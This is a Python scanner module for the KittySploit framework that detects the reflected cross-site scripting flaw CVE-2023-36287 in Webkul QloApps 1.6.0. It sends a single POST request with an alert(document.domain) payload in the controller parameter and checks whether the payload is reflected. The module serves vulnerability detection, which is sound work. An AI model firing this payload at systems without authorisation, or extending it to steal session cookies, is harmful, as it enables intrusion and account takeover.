#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An unauthenticated Cross-Site Scripting (XSS) vulnerability found in Webkul QloApps 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Webkul QloApps 1.6.0 - Cross-site Scripting Detection',
        'description': "An unauthenticated Cross-Site Scripting (XSS) vulnerability found in Webkul QloApps 1.6.0 allows an attacker to obtain a user's session cookie and then impersonate that user via POST controller parameter.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'xss', 'webkul-qloapps', 'unauth', 'webkul', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/webkul/hotelcommerce',
            'https://flashy-lemonade-192.notion.site/Cross-site-scripting-via-controller-parameter-in-QloApps-1-6-0-97e409ce164f40d195b625b9bf719900',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-36287',
        ],
        'cve': 'CVE-2023-36287',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="controller=change-currency9405'-alert(document.domain)-'&id_currency=\n")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("'change-currency9405'-alert(document.domain)-'';", 'customizationIdMessage',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Webkul QloApps 1.6.0 - Cross-site Scripting detected', path=path)
            return True
        return False

